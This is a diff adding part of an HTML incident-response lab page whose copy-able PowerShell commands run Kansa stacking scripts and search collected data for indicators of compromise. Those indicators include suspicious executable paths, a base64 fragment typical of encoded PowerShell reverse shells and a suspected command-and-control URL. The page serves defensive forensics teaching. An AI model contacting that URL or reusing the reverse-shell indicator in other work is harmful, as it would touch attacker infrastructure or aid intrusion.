+    <pre>cp ..\..\Kansa\Analysis\Get-LogparserStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-LogparserStack.ps1</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\SmbShare</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\Get-LogparserStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-LogparserStack.ps1</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *.csv -Pattern "share\$" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\LocalAdmins\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\config\Get-LocalAdminStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-LocalAdminStack.ps1</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *LocalAdmins.csv -Pattern "helpdesk" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\Analysis\Get-SchedTasksAllStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-SchedTasksAllStack.ps1 > SchedTasksAllStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *SchedTasks.csv -Pattern "HealthCheck" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\SvcFail\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\asep\Get-SvcFailStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-SvcFailStack.ps1 > SvcFailStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\asep\Get-SvcFailCmdLineStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-SvcFailCmdLineStack.ps1</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *SvcFail.csv -Pattern "powershell" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\SvcAll\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\asep\Get-SvcAllStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-SvcAllStack.ps1 > SvcAllStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *SvcAll.csv -Pattern "Diagostic System Host", "vmhK" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\Autorunsc\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\asep\Get-ASEPImagePathLaunchStringUnsignedStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-ASEPImagePathLaunchStringUnsignedStack.ps1 > ASEPImagePathLaunchStringUnsignedStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *Autorunsc.csv -Pattern "c:\\windows\\l9xje2ia.exe", "c:\\windows\\ggwmgfmt.exe", "c:\\windows\\temp\\svchost.exe" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\Analysis\Get-ASEPLaunchStringStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-ASEPLaunchStringStack.ps1 > ASEPLaunchStringStack.csv</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *Autorunsc.csv -Pattern "JABjAGwAaQBlAG4Ad" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>Select-String -Path *Autorunsc.csv -Pattern "https://fini-27q.pages.dev:8080/a" | Select-Object Filename, LineNumber, Line</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cd ..\WMIEvtConsumer\</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>cp ..\..\Kansa\Analysis\Get-LogparserStack.ps1 .</pre>
+  </div>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <pre>.\Get-LogparserStack.ps1</pre>
+  </div>
+</div>
+
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/IR-8842">Collection and Analysis Challenge</a></li>
+  <li><a target="_blank" href="https://soc201.com/dfir-report">The DFIR Report</a></li>
+  <li><a target="_blank" href="https://soc201.com/tuvHvU">Per-user Services (Microsoft)</a></li>
+</ul>
+
+
+
+<!--
+<h1>Cyber Threat Intelligence</h1>
+
+<div class="code-block">
+  <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <pre>echo "Hello World"</pre>
+</div>
+
+<h2>References</h2>
+<ul>
+  <li><a target="_blank" href="https://soc201.com/attack">MITRE ATT&CK</a></li>
+</ul>
+-->
+
+
+<script>
+function copyCode(button) {
+  const code = button.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  button.textContent = "Copied!";
+  setTimeout(() => button.textContent = "Copy", 1500);
+}
+
+window.addEventListener("DOMContentLoaded", () => {
+  const tocList = document.getElementById("toc-list");
+  const headers = document.querySelectorAll("h1");
+  headers.forEach((header, i) => {
+    const id = "section-" + (i + 1);
+    header.id = id;
+    const li = document.createElement("li");
+    const a = document.createElement("a");
+    a.href = "#" + id;
+    a.textContent = header.textContent;
+    li.appendChild(a);
+    tocList.appendChild(li);
+  });
+});
+</script>
+
+</body>
+</html>
